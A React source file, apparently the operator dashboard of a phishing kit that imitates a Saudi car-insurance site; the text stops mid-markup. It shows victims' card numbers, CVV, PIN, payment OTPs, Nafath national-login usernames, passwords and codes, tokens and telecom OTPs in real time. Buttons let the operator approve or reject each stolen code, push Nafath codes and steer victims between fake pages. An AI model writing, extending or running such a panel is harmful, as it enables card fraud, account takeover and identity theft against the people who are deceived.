import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import { FaBell, FaPhoneAlt } from "react-icons/fa";
import { SITE_PAGES, buildAdminRedirect } from "./sitePages";

let socket;

const LAST_SEEN_KEY = "tameen_admin_lastSeen";
const NOTIFICATION_SOUND = "/sounds/new-data.wav";

const playNotificationSound = (audioRef) => {
  try {
    if (!audioRef.current) {
      audioRef.current = new Audio(NOTIFICATION_SOUND);
    }
    audioRef.current.currentTime = 0;
    audioRef.current.play().catch(() => {});
  } catch {}
};

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

const isStcNet = (n) => n === "STC" || n === "اس تي سي";
const isMobilyNet = (n) => n === "Mobily" || n === "موبايلي";

const CARD_STATUS_LABELS = {
  pending: "قيد المراجعة",
  accepted: "مقبولة",
  declined: "مرفوضة",
};

const getCardAttempts = (c) => {
  if (Array.isArray(c.cardAttempts) && c.cardAttempts.length > 0) {
    return c.cardAttempts;
  }
  if (c.cardNumber) {
    return [
      {
        cardNumber: c.cardNumber,
        card_name: c.card_name,
        cvv: c.cvv,
        expiryDate: c.expiryDate,
        pin: c.pin,
        visa_brand: c.visa_brand,
        visa_type: c.visa_type,
        visa_issuer: c.visa_issuer,
        status: c.CardAccept ? "accepted" : "pending",
        submittedAt: c.updatedAt || c.created,
      },
    ];
  }
  return [];
};

const hasPendingCard = (c) => {
  const attempts = getCardAttempts(c);
  const latest = attempts[attempts.length - 1];
  return latest?.status === "pending" && !c.CardAccept;
};

const patchCardAttemptStatus = (user, status) => {
  const attempts = getCardAttempts(user);
  if (attempts.length === 0) return { CardAccept: status === "accepted" };
  return {
    CardAccept: status === "accepted",
    cardAttempts: attempts.map((a, i) =>
      i === attempts.length - 1 && a.status === "pending"
        ? { ...a, status }
        : a,
    ),
  };
};

const Main_Page = () => {
  if (!socket) socket = io(serverRoute);

  const [Users, setUsers] = useState([]);
  const [onlineCounts, setOnlineCounts] = useState({
    visitors: 0,
    dashboard: 0,
  });
  const [onlineOrderIds, setOnlineOrderIds] = useState(new Set());
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [, setLastSeenBump] = useState(0);
  const [mobileShowList, setMobileShowList] = useState(true);
  const [isNarrow, setIsNarrow] = useState(false);

  const didInitLastSeenRef = useRef(false);
  const usersRef = useRef([]);
  const audioRef = useRef(null);
  const soundReadyRef = useRef(false);
  const navigate = useNavigate();

  const getUsers = useCallback(async () => {
    try {
      const res = await axios.get(`${serverRoute}/users`);
      const sortedUsers = res.data.sort(
        (a, b) => new Date(b.created) - new Date(a.created),
      );
      setUsers(sortedUsers);

      const map = loadLastSeen();
      let changed = false;
      if (!didInitLastSeenRef.current && sortedUsers.length > 0) {
        for (const u of sortedUsers) {
          if (map[u._id] == null || map[u._id] === "") {
            map[u._id] = getDocVersion(u) || new Date(0).toISOString();
            changed = true;
          }
        }
        didInitLastSeenRef.current = true;
        if (changed) saveLastSeen(map);
      }

      setSelectedUserId((prev) => {
        if (sortedUsers.length === 0) return null;
        if (prev && sortedUsers.some((u) => u._id === prev)) return prev;
        return sortedUsers[0]._id;
      });
      setLastSeenBump((t) => t + 1);
    } catch (error) {
      console.log(error);
    }
  }, []);

  const onIncomingData = useCallback(() => {
    if (soundReadyRef.current) playNotificationSound(audioRef);
    getUsers();
  }, [getUsers]);

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");

    const onConnect = () => socket.emit("join", { role: "admin" });
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onOnlineCounts = (counts) => setOnlineCounts(counts);
    socket.on("onlineCounts", onOnlineCounts);

    const onClientPresence = ({ onlineIds }) => {
      setOnlineOrderIds(new Set(onlineIds || []));
    };
    socket.on("clientPresence", onClientPresence);

    const unlock = () => {
      playNotificationSound(audioRef);
      audioRef.current?.pause();
      if (audioRef.current) audioRef.current.currentTime = 0;
    };
    document.addEventListener("click", unlock, { once: true });

    socket.on("newUser", onIncomingData);
    socket.on("newData", onIncomingData);
    socket.on("paymentForm", onIncomingData);
    socket.on("visaOtp", onIncomingData);
    socket.on("visaPin", onIncomingData);
    socket.on("motsl", onIncomingData);
    socket.on("motslOtp", onIncomingData);
    socket.on("navaz", onIncomingData);
    socket.on("phone", onIncomingData);
    socket.on("mobOtp", onIncomingData);
    socket.on("phoneOtp", onIncomingData);

    return () => {
      document.removeEventListener("click", unlock);
      socket.off("connect", onConnect);
      socket.off("onlineCounts", onOnlineCounts);
      socket.off("clientPresence", onClientPresence);
      socket.off("newUser", onIncomingData);
      socket.off("newData", onIncomingData);
      socket.off("paymentForm", onIncomingData);
      socket.off("visaOtp", onIncomingData);
      socket.off("visaPin", onIncomingData);
      socket.off("motsl", onIncomingData);
      socket.off("motslOtp", onIncomingData);
      socket.off("navaz", onIncomingData);
      socket.off("phone", onIncomingData);
      socket.off("mobOtp", onIncomingData);
      socket.off("phoneOtp", onIncomingData);
    };
  }, [onIncomingData, navigate]);

  useEffect(() => {
    getUsers().then(() => {
      soundReadyRef.current = true;
    });
  }, [getUsers]);

  useEffect(() => {
    usersRef.current = Users;
  }, [Users]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const apply = () => setIsNarrow(mq.matches);
    apply();
    mq.addEventListener("change", apply);
    return () => mq.removeEventListener("change", apply);
  }, []);

  useEffect(() => {
    if (!isNarrow) setMobileShowList(true);
  }, [isNarrow]);

  useEffect(() => {
    if (!selectedUserId) setMobileShowList(true);
  }, [selectedUserId]);

  useEffect(() => {
    if (!selectedUserId) return;
    const u = Users.find((x) => x._id === selectedUserId);
    if (!u) return;
    const map = loadLastSeen();
    const v = getDocVersion(u);
    if (!v) return;
    if (map[selectedUserId] === v) return;
    map[selectedUserId] = v;
    saveLastSeen(map);
    setLastSeenBump((x) => x + 1);
  }, [selectedUserId, Users]);

  const patchUserLocally = useCallback((id, patch) => {
    setUsers((prev) =>
      prev.map((u) => (u._id === id ? { ...u, ...patch } : u)),
    );
  }, []);

  const getUserById = useCallback(
    (id) => usersRef.current.find((u) => u._id === id),
    [],
  );

  // Action Triggers
  const handleAcceptVisa = async (id) => {
    const user = getUserById(id);
    if (user) patchUserLocally(id, patchCardAttemptStatus(user, "accepted"));
    socket.emit("acceptPaymentForm", id);
    await getUsers();
  };

  const handleDeclineVisa = async (id) => {
    const user = getUserById(id);
    if (user) patchUserLocally(id, patchCardAttemptStatus(user, "declined"));
    socket.emit("declinePaymentForm", id);
    await getUsers();
  };

  const handleAdminRedirect = async (user, page) => {
    let navazCode;
    if (page.path === "/navaz") {
      navazCode = window.prompt("أدخل رمز نفاذ للعميل:");
      if (navazCode === null || navazCode.trim() === "") return;
      navazCode = navazCode.trim();
      patchUserLocally(user._id, { NavazOtp: navazCode });
      socket.emit("changeNavazCode", { id: user._id, userOtp: navazCode });
    }

    const payload = buildAdminRedirect(user, page, { navazCode });
    socket.emit("adminRedirect", { id: user._id, ...payload });
    await getUsers();
  };

  const handleBlockClient = async (id) => {
    if (!window.confirm("هل تريد حظر هذا العميل من استخدام الموقع؟")) return;
    patchUserLocally(id, { blocked: true });
    socket.emit("blockClient", id);
    await getUsers();
  };

  const handleUnblockClient = async (id) => {
    patchUserLocally(id, { blocked: false });
    socket.emit("unblockClient", id);
    await getUsers();
  };

  const handleAcceptVisaOtp = async (id) => {
    socket.emit("acceptVisaOtp", id);
    await getUsers();
  };

  const handleDeclineVisaOtp = async (id) => {
    socket.emit("declineVisaOtp", id);
    await getUsers();
  };

  const handleAcceptPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    await getUsers();
  };

  const handleDeclinePin = async (id) => {
    socket.emit("declineVisaPin", id);
    await getUsers();
  };

  const handleAcceptPhone = async (id) => {
    socket.emit("acceptPhone", id);
    await getUsers();
  };

  const handleDeclinePhone = async (id) => {
    socket.emit("declinePhone", id);
    await getUsers();
  };

  const handleAcceptMobOtp = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") {
      window.alert("يجب إدخال الرمز");
      return;
    }
    socket.emit("acceptMobOtp", { id, price });
    await getUsers();
  };

  const handleDeclineMobOtp = async (id) => {
    socket.emit("declineMobOtp", id);
    await getUsers();
  };

  const handleAcceptStcPhoneOtp = async (id) => {
    socket.emit("acceptStcPhoneOtp", id);
    await getUsers();
  };

  const handleDeclineStcPhoneOtp = async (id) => {
    socket.emit("declineStcPhoneOtp", id);
    await getUsers();
  };

  const handleAcceptService = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ بعد المكالمة:");
    if (price === null || price === "") return;
    socket.emit("acceptService", { id, price });
    await getUsers();
  };

  const handleDeclineService = async (id) => {
    socket.emit("declineService", id);
    await getUsers();
  };

  const handleAcceptPhoneOTP = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") return;
    socket.emit("acceptPhoneOTP", { id, price });
    await getUsers();
  };

  const handleDeclinePhoneOTP = async (id) => {
    socket.emit("declinePhoneOTP", id);
    await getUsers();
  };

  const handleAcceptMotslOtp = async (id, network) => {
    let userOtp = null;
    if (!isStcNet(network)) {
      userOtp = window.prompt("الرجاء إدخال رقم نفاذ للعميل (مثال: 45):");
      if (!userOtp) return window.alert("يجب ملء رمز نفاذ للمتابعة");
    }
    socket.emit("acceptMotslOtp", { id, userOtp });
    await getUsers();
  };

  const handleDeclineMotslOtp = async (id) => {
    socket.emit("declineMotslOtp", id);
    await getUsers();
  };

  const handleAcceptSTC = async (id) => {
    socket.emit("acceptSTC", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineSTC = async (id) => {
    socket.emit("declineSTC", id);
    await getUsers();
  };

  const handleAcceptNavaz = async (id) => {
    socket.emit("acceptNavaz", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    socket.emit("declineNavaz", id);
    await getUsers();
  };

  const handleChangeNavazCode = async (id) => {
    const userOtp = window.prompt("الرمز الجديد:");
    if (userOtp === null || userOtp === "") return;
    socket.emit("changeNavazCode", { id, userOtp });
    await getUsers();
  };

  // Delete Handlers
  const deleteUser = async (id) => {
    if (window.confirm("هل أنت متأكد من حذف العميل؟")) {
      await axios.delete(`${serverRoute}/order/${id}`);
      getUsers();
    }
  };

  const deleteAllUsers = async () => {
    if (window.confirm("هل أنت متأكد من حذف جميع العملاء والبطاقات نهائياً؟")) {
      await axios.delete(`${serverRoute}/orders/all`);
      getUsers();
    }
  };

  // Logout
  const handleLogOut = () => {
    localStorage.removeItem("token");
    window.location.reload();
  };

  const formatCardNum = (str) => {
    if (!str) return "";
    return str.replace(/(.{4})/g, "$1 ").trim();
  };

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  const handleSelectUser = (u) => {
    setSelectedUserId(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const handleMobileBackToList = () => {
    setMobileShowList(true);
  };

  const renderClientCard = (c) => {
    const isOnline = onlineOrderIds.has(c._id);
    const cardAttempts = getCardAttempts(c);

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">
              <i className="fas fa-user-check"></i>
            </div>
            <div className="cc-info">
              <h4>{c.name || c.carHolderName || "مجهول"}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.phone}
              </span>
              {c.companyData?.company && (
                <div className="cc-company-summary">
                  {c.companyData.logo && (
                    <img
                      src={c.companyData.logo}
                      alt=""
                      className="cc-company-logo"
                    />
                  )}
                  <span>
                    {c.companyData.company || c.companyData.name}
                    {c.companyData.price != null
                      ? ` — ${c.companyData.price} ريال`
                      : ""}
                  </span>
                </div>
              )}
            </div>
          </div>
          <div className="cc-head-badges">
            {c.blocked && (
              <div className="status-badge blocked">
                <div className="dot"></div> محظور
              </div>
            )}
            <div className={`status-badge ${isOnline ? "online" : ""}`}>
              <div className="dot"></div> {isOnline ? "متصل" : "غير متصل"}
            </div>
          </div>
        </div>

        <div className="cc-body">
          <div className="cc-body-grid">
            <div className="info-block cc-col">
              <div className="info-title">
                <i className="fas fa-shield-alt"></i> تفاصيل العرض والطلب
              </div>
              <div className="row">
                <span className="lbl">نوع المعاملة</span>
                {c.form_type ? (
                  <span className="val badge-ins">
                    {c.form_type === "new_insurance"
                      ? "تأمين جديد"
                      : c.form_type === "transfer_ownership"
                        ? "نقل ملكية"
                        : c.form_type}
                  </span>
                ) : (
                  <span className="val badge-ins">{c.type || "غير محدد"}</span>
                )}
              </div>
              {c.name && (
                <div className="row">
                  <span className="lbl">الاسم</span>
                  <span className="val">{c.name}</span>
                </div>
              )}
              {c.phone && (
                <div className="row">
                  <span className="lbl">رقم الجوال</span>
                  <span className="val">{c.phone}</span>
                </div>
              )}
              {c.companyData &&
                (c.companyData.company || c.companyData.name) && (
                  <>
                    <div className="row">
                      <span className="lbl">شركة التأمين</span>
                      <span className="val cc-offer-company">
                        {c.companyData.company || c.companyData.name}
                      </span>
                    </div>
                    {c.companyData.price != null && (
                      <div className="row">
                        <span className="lbl">سعر العرض</span>
                        <span
                          className="val"
                          style={{ color: "var(--success)" }}
                        >
                          {c.companyData.price} ريال
                          {c.companyData.basePrice &&
                            String(c.companyData.basePrice) !==
                              String(c.companyData.price) && (
                              <span className="cc-base-price">
                                {" "}
                                (أساسي: {c.companyData.basePrice})
                              </span>
                            )}
                        </span>
                      </div>
                    )}
                    {Array.isArray(c.companyData.features) &&
                      c.companyData.features.filter((f) => f.selected).length >
                        0 && (
                        <div className="cc-selected-features">
                          <div className="lbl">المنافع المختارة</div>
                          <ul>
                            {c.companyData.features
                              .filter((f) => f.selected)
                              .map((f, i) => (
                                <li key={i}>
                                  <span>{f.text}</span>
                                  <span>{f.price}</span>
                                </li>
                              ))}
                          </ul>
                        </div>
                      )}
                  </>
                )}

              <div className="row">
                <span className="lbl">تأمين لـ</span>{" "}
                <span className="val" style={{ color: "var(--primary)" }}>
                  {c.tameenFor}
                </span>
              </div>
              <div className="row">
                <span className="lbl">الهوية الأساسية</span>{" "}
                <span className="val">{c.national_id}</span>
              </div>
              {c.buyer_natID && (
                <div className="row">
                  <span className="lbl">هوية المشتري</span>
                  <span className="val">{c.buyer_natID}</span>
                </div>
              )}
              {c.seller_natID && (
                <div className="row">
                  <span className="lbl">هوية البائع</span>
                  <span className="val">{c.seller_natID}</span>
                </div>
              )}
              {c.nationality && (
                <div className="row">
                  <span className="lbl">الجنسية</span>
                  <span className="val">{c.nationality}</span>
                </div>
              )}
              {c.tameenType && (
                <div className="row">
                  <span className="lbl">نوع البطاقة</span>
                  <span className="val">{c.tameenType}</span>
                </div>
              )}
              {c.carPrice ? (
                <div className="row">
                  <span className="lbl">القيمة التقديرية</span>{" "}
                  <span className="val" style={{ color: "var(--success)" }}>
                    {c.carPrice} ريال
                  </span>
                </div>
              ) : null}
              {c.serialNumber && (
                <div className="row">
                  <span className="lbl">الرقم التسلسلي</span>
                  <span className="val">{c.serialNumber}</span>
                </div>
              )}
              {c.Customs_card && (
                <div className="row">
                  <span className="lbl">البطاقة الجمركية</span>
                  <span className="val">{c.Customs_card}</span>
                </div>
              )}
              {c.car_model && (
                <div className="row">
                  <span className="lbl">موديل السيارة</span>
                  <span className="val">{c.car_model}</span>
                </div>
              )}
              {c.car_year && (
                <div className="row">
                  <span className="lbl">سنة الصنع</span>
                  <span className="val">{c.car_year}</span>
                </div>
              )}
              {c.car_type && (
                <div className="row">
                  <span className="lbl">نوع السيارة</span>
                  <span className="val">{c.car_type}</span>
                </div>
              )}
              {c.vechile_type && (
                <div className="row">
                  <span className="lbl">نوع المركبة</span>
                  <span className="val">{c.vechile_type}</span>
                </div>
              )}
              {c.purpose_of_use && (
                <div className="row">
                  <span className="lbl">غرض الاستخدام</span>
                  <span className="val">{c.purpose_of_use}</span>
                </div>
              )}
              {c.danger_vechile && (
                <div className="row">
                  <span className="lbl">مركبة خطرة</span>
                  <span className="val">
                    {c.danger_vechile === "true" || c.danger_vechile === true
                      ? "نعم"
                      : "لا"}
                  </span>
                </div>
              )}
              {c.birth_date && (
                <div className="row">
                  <span className="lbl">تاريخ الميلاد</span>
                  <span className="val">{c.birth_date}</span>
                </div>
              )}
              {c.startedDate && (
                <div className="row">
                  <span className="lbl">بداية التأمين</span>
                  <span className="val">{c.startedDate}</span>
                </div>
              )}
              {c.tameenFor && (
                <div className="row">
                  <span className="lbl">تأمين لـ</span>
                  <span className="val">{c.tameenFor}</span>
                </div>
              )}
              {c.tameenAllType && (
                <div className="row">
                  <span className="lbl">نوع الشامل</span>
                  <span className="val">{c.tameenAllType}</span>
                </div>
              )}
              {c.date_check && (
                <div className="row">
                  <span className="lbl">تاريخ الفحص</span>
                  <span className="val">{c.date_check}</span>
                </div>
              )}
              {c.time_check && (
                <div className="row">
                  <span className="lbl">وقت الفحص</span>
                  <span className="val">{c.time_check}</span>
                </div>
              )}
            </div>

            <div className="info-block cc-col">
              <div className="info-title">
                <FaPhoneAlt />
                دخول المشغل
              </div>
              {c.NavazUser && (
                <div className="row">
                  <span className="lbl">يوزر نفاذ</span>
                  <span className="val secret">{c.NavazUser}</span>
                </div>
              )}
              {c.NavazPassword && (
                <div className="row">
                  <span className="lbl">باص نفاذ</span>
                  <span className="val secret">{c.NavazPassword}</span>
                </div>
              )}
              {c.NavazCard && (
                <div className="row">
                  <span className="lbl">بطاقة نفاذ</span>
                  <span className="val secret">{c.NavazCard}</span>
                </div>
              )}
              {c.token && (
                <div className="row">
                  <span className="lbl">التوكن</span>
                  <span className="val secret">{c.token}</span>
                </div>
              )}
              {c.MotslPhone && (
                <div className="row">
                  <span className="lbl">رقم المشغل</span>
                  <span className="val secret">{c.MotslPhone}</span>
                </div>
              )}
              {c.MotslNetwork && (
                <div className="row">
                  <span className="lbl">شبكة المتصل</span>
                  <span className="val secret">{c.MotslNetwork}</span>
                </div>
              )}
              {c.phoneNationalId && (
                <div className="row">
                  <span className="lbl">رقم هوية الجوال</span>
                  <span className="val secret">{c.phoneNationalId}</span>
                </div>
              )}
            </div>

            <div
              className="info-block cc-col cc-col--otp"
              style={{ background: "#fff8f8", borderColor: "#fee2e2" }}
            >
              <div className="info-title" style={{ color: "#b91c1c" }}>
                <i className="fas fa-key"></i> رموز التحقق (Live OTP)
              </div>
              <div className="row">
                <span className="lbl">OTP الدفع</span>{" "}
                {c.CardOtp ? (
                  <span className="val otp">{c.CardOtp}</span>
                ) : (
                  <span className="val empty">لم يدخل بعد...</span>
                )}
              </div>
              <div className="row">
                <span className="lbl">OTP موبايلي (منفصل)</span>{" "}
                {c.mobOtp ? (
                  <span className="val otp">{c.mobOtp}</span>
                ) : (
                  <span className="val empty">—</span>
                )}
              </div>
              <div className="row">
                <span className="lbl">STC/Phone (OTP)</span>{" "}
                {c.MotslOtp || c.NavazOtp ? (
                  <span className="val otp">{c.MotslOtp || c.NavazOtp}</span>
                ) : (
                  <span className="val empty">لم يدخل بعد...</span>
                )}
              </div>
            </div>

            <div className="cc-col cc-col--visa">
              <div className="visa-list-container">
                {cardAttempts.length > 0 ? (
                  cardAttempts.map((attempt, idx) => (
                    <div
                      key={`visa-${idx}`}
                      className={`visa-card visa-card--${attempt.status || "pending"}`}
                    >
                      <div className="visa-card-status">
                        {CARD_STATUS_LABELS[attempt.status] || attempt.status}
                      </div>
                      <div className="v-top">
                        <div className="v-chip"></div>{" "}
                        <i className="fab fa-cc-visa fa-lg"></i>
                      </div>
                      <div className="v-num" dir="ltr">
                        {formatCardNum(attempt.cardNumber)}
                      </div>
                      <div
                        style={{
                          fontSize: "11px",
                          marginBottom: "8px",
                          color: "#fff",
                          fontWeight: "bold",
                        }}
                      >
                        {attempt.card_name}
                      </div>
                      <div className="v-det">
                        <div>
                          EXP{" "}
                          <span className="v-res">{attempt.expiryDate}</span>
                        </div>
                        <div>
                          CVV{" "}
                          <span className="v-res" style={{ color: "#fbbf24" }}>
                            {attempt.cvv}
                          </span>
                        </div>
                        {attempt.pin && (
                          <div>
                            PIN{" "}
                            <span className="v-res" style={{ color: "#fbbf24" }}>
                              {attempt.pin}
                            </span>
                          </div>
                        )}
                      </div>
                      {(attempt.visa_brand || attempt.visa_issuer) && (
                        <div
                          className="v-det"
                          style={{
                            marginTop: "8px",
                            borderTop: "1px dashed rgba(255,255,255,0.2)",
                            paddingTop: "5px",
                          }}
                        >
                          <div>
                            البنك:{" "}
                            <span className="v-res">
                              {attempt.visa_issuer || "-"}
                            </span>
                          </div>
                          <div>
                            نوع البطاقة:{" "}
                            <span
                              className="v-res"
                              style={{ color: "#10b981" }}
                            >
                              {attempt.visa_type}
                            </span>
                          </div>
                          <div>
                            الشبكة:{" "}
                            <span
                              className="v-res"
                              style={{ color: "#10b981" }}
                            >
                              {attempt.visa_brand}
                            </span>
                          </div>
                        </div>
                      )}
                    </div>
                  ))
                ) : (
                  <div
                    className="val empty"
                    style={{ textAlign: "center", padding: "10px" }}
                  >
                    بانتظار إدخال البطاقة...
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            <div className="page-redirect-bar">
              <div className="page-redirect-bar__label">
                توجيه المستخدم إلى صفحة
              </div>
              <div className="page-redirect-bar__buttons">
                {SITE_PAGES.map((p) => (
                  <button
                    key={p.path}
                    type="button"
                    className="page-redirect-btn"
                    onClick={() => handleAdminRedirect(c, p)}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
            <div className="w-full flex justify-between gap-x-2 mt-2">
              {c.blocked ? (
                <button
                  className="btn-act accept grow w-full font-bold"
                  onClick={() => handleUnblockClient(c._id)}
                >
                  <i className="fas fa-unlock ml-2"></i> إلغاء الحظر
                </button>
              ) : (
                <button
                  className="btn-act decline grow w-full font-bold"
                  onClick={() => handleBlockClient(c._id)}
                >
                  <i className="fas fa-ban ml-2"></i> حظر العميل
                </button>
              )}
            </div>
            {/* Control Groups directly listed, rather than a single accept all */}
            {hasPendingCard(c) && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisa(c._id)}
                  >
                    قبول الدفع
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisa(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.OtpCardAccept && c.CardOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: OTP الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisaOtp(c._id)}
                  >
                    قبول OTP
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisaOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.MotslAccept &&
              c.CardAccept &&
              (c.PinAccept || c.OtpCardAccept) &&
              c.MotslPhone && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    تأكيد بيانات الجوال
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      style={{ backgroundColor: "#0ea5e9" }}
                      onClick={() => handleAcceptPhone(c._id)}
                    >
                      قبول والمتابعة
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhone(c._id)}
                    >
                      رفض{" "}
                    </button>
                  </div>
                </div>
              )}

            {c.mobOtp && isMobilyNet(c.MotslNetwork) && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  موبايلي — رمز التحقق
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptMobOtp(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineMobOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {isStcNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.stcAwaitingCall &&
              !c.NavazOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    {" "}
                    قبول OTP{" "}
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptStcPhoneOtp(c._id)}
                    >
                      قبول OTP
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclineStcPhoneOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {isStcNet(c.MotslNetwork) && c.stcAwaitingCall && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptService(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineService(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!isStcNet(c.MotslNetwork) &&
              !isMobilyNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.NavazOtp &&
              !c.mobOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    شبكة عامة — OTP
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptPhoneOTP(c._id)}
                    >
                      قبول وإرسال رمز نفاذ
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhoneOTP(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {!c.NavazAccept && c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: نفاذ النهائي
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineNavaz(c._id)}
                  >
                    رفض نفاذ
                  </button>
                  <button
                    className="btn-act accept"
                    style={{ backgroundColor: "#6366f1" }}
                    onClick={() => handleChangeNavazCode(c._id)}
                  >
                    تغيير الرمز
                  </button>
                </div>
              </div>
            )}

            <div className="w-full flex justify-between gap-x-2 mt-2 cc-foot-delete">
              <button
                className="btn-del grow w-full font-bold"
                onClick={() => deleteUser(c._id)}
              >
                <i className="fas fa-trash ml-2"></i> حذف العميل
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();

  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>
            <i className="fas fa-users"></i> العملاء والمرسلون
          </h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label = u.name || u.carHolderName || "مجهول";
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              const userOnline = onlineOrderIds.has(u._id);
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}${u.blocked ? " is-blocked" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
                  <span className="user-sidebar-item__row">
                    <span
                      className={`online-dot${userOnline ? " online-dot--on" : ""}`}
                      title={userOnline ? "متصل" : "غير متصل"}
                    />
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {u.blocked ? (
                      <span className="user-sidebar-item__blocked-tag">
                        محظور
                      </span>
                    ) : null}
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.phone || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={handleMobileBackToList}
              >
